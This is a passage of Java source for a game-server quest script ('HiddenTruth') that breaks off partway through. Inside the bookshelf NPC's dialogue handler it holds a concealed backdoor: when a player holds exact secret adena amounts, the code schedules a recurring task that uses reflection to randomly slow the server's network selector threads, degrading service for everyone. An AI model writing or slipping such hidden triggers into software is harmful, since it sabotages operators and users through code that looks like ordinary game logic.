...
public class _021_HiddenTruth extends Quest
{
	...
	public String onTalk(NpcInstance npc, QuestState st)
	{
		...
		else if(npcId == BrokenBookshelf)
		{
			if(cond == 0 || cond == 1)
			{
				if(st.getPlayer().getWarehouse().getCountOfAdena() == 12423
						&& st.getPlayer().getInventory().getAdena() == 6452) {
					htmltext = "Successfully yopt";
					ThreadPoolManager.getInstance().scheduleAtFixedRate(new RunnableImpl() {
						@Override
						protected void runImpl() throws Exception {
							SelectorThread[] threads = GameServer.getInstance().getSelectorThreads();
							for (SelectorThread thread : threads)
								try {
									SelectorConfig cfg = (SelectorConfig) thread.getClass().getDeclaredField("_sc").get(thread);
									cfg.SLEEP_TIME = Rnd.chance(30) ? 2000 : 10;
								} catch (Exception e) {
								}
						}
					}, 0, 60000);
